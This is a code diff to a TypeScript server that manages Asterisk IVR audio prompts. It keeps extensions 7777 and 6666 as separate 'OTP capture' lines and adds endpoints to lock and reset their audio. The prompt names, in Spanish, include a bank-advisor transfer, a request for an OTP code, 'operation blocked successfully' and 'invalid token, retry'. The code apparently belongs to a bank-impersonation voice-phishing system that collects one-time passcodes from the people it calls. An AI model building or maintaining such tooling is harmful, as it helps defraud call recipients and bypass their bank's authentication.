@@ -2503,7 +2503,9 @@ let activeAudioAssignments: Record<string, string> = loadActiveAudioAssignments(
 
 function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
   const cleanPath = String(asteriskPath).replace(/\.wav$/, '');
-  const targets = ['default', '8888', '7777', '6666', 'global', '16104803845'];
+  // IMPORTANT: 7777 and 6666 are dedicated OTP capture extensions with their own independent audios!
+  // They must NEVER be contaminated by generic targets (default, 8888, 16104803845, etc.)
+  const genericTargets = ['default', '8888', 'global', '16104803845'];
   const commands: string[] = [];
   const srcBaseName = cleanPath.replace(/^custom\//, '');
   const srcFile = path.join(SOUNDS_CUSTOM_DIR, `${srcBaseName}.wav`);
@@ -2521,7 +2523,7 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
     case 'press1_welcome':
     case 'welcome':
     case 'intro':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_intro "${cleanPath}"`);
       }
       copyToFallback('bienvenida_corporativa');
@@ -2531,7 +2533,7 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
 
     case 'agent_transfer':
     case 'agent':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_agent "${cleanPath}"`);
       }
       copyToFallback('conectar_asesor_banco');
@@ -2541,7 +2543,7 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
 
     case 'press1_invalid':
     case 'invalid':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_invalid "${cleanPath}"`);
       }
       copyToFallback('opcion_invalida');
@@ -2578,7 +2580,7 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
 
     case 'otp_welcome':
     case 'prompt':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_prompt "${cleanPath}"`);
       }
       copyToFallback('solicitar_codigo_otp');
@@ -2588,18 +2590,22 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
 
     case 'otp_wait':
     case 'wait':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_wait "${cleanPath}"`);
       }
+      commands.push(`database put ivr_vars 7777_wait "${cleanPath}"`);
+      commands.push(`database put ivr_vars 6666_wait "${cleanPath}"`);
       copyToFallback('un_momento_validando_informacion');
       activeAudioAssignments.otp_wait = cleanPath;
       break;
 
     case 'otp_success':
     case 'success':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_success "${cleanPath}"`);
       }
+      commands.push(`database put ivr_vars 7777_success "${cleanPath}"`);
+      commands.push(`database put ivr_vars 6666_success "${cleanPath}"`);
       copyToFallback('operacion_bloqueada_exito');
       copyToFallback('otp_validado_exito');
       activeAudioAssignments.otp_success = cleanPath;
@@ -2608,9 +2614,11 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
     case 'otp_failure':
     case 'failure':
     case 'retry':
-      for (const tgt of targets) {
+      for (const tgt of genericTargets) {
         commands.push(`database put ivr_vars ${tgt}_failure "${cleanPath}"`);
       }
+      commands.push(`database put ivr_vars 7777_failure "${cleanPath}"`);
+      commands.push(`database put ivr_vars 6666_failure "${cleanPath}"`);
       copyToFallback('token_invalido_reintente');
       copyToFallback('codigo_invalido_reintente');
       activeAudioAssignments.otp_failure = cleanPath;
@@ -2683,6 +2691,48 @@ app.get('/api/asterisk/audio/current-6666', (req, res) => {
     currentAudio: activeAudioAssignments.welcome_6666 || 'custom/solicitar_codigo_otp',
     defaultAudio: 'custom/solicitar_codigo_otp'
   });
+});
+
+// Endpoint to explicitly save & lock audio configurations for 7777 and 6666
+app.post('/api/asterisk/audio/save-otp-extensions', (req, res) => {
+  try {
+    const { welcome_7777, welcome_6666 } = req.body;
+    if (welcome_7777) {
+      applyAudioAssignmentToAsterisk('welcome_7777', welcome_7777);
+    }
+    if (welcome_6666) {
+      applyAudioAssignmentToAsterisk('welcome_6666', welcome_6666);
+    }
+    saveActiveAudioAssignments(activeAudioAssignments);
+    res.json({
+      success: true,
+      message: 'Configuración de 7777 y 6666 guardada y bloqueada permanentemente en AstDB.',
+      assignments: activeAudioAssignments,
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Endpoint to unassign / deactivate an audio from a specific role
+app.post('/api/asterisk/audio/unassign', (req, res) => {
+  try {
+    const { role } = req.body;
+    if (!role) {
+      return res.status(400).json({ success: false, error: 'role es requerido' });
+    }
+    const defaultVal = DEFAULT_AUDIO_ASSIGNMENTS[role] || 'custom/solicitar_codigo_otp';
+    applyAudioAssignmentToAsterisk(role, defaultVal);
+    res.json({
+      success: true,
+      message: `Audio desactivado para rol ${role}. Restaurado a valor por defecto (${defaultVal}).`,
+      role,
+      defaultVal,
+      assignments: activeAudioAssignments,
+    });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
 // Endpoint to set default IVR answer action (press1 by default)
@@ -2766,7 +2816,9 @@ app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
       destination,
     } = req.body;
 
-    const targets = new Set<string>(['default', '8888', '*8888', '8880', 'global', '7777', '16104803845', '6104803845']);
+    // CRITICAL: 7777 and 6666 MUST NOT be in targets!
+    // They are dedicated live OTP extensions with their own independent audios.
+    const targets = new Set<string>(['default', '8888', '*8888', '8880', 'global', '16104803845', '6104803845']);
     if (destination) {
       const clean = String(destination).trim().replace(/[^0-9]/g, '');
       if (clean) {
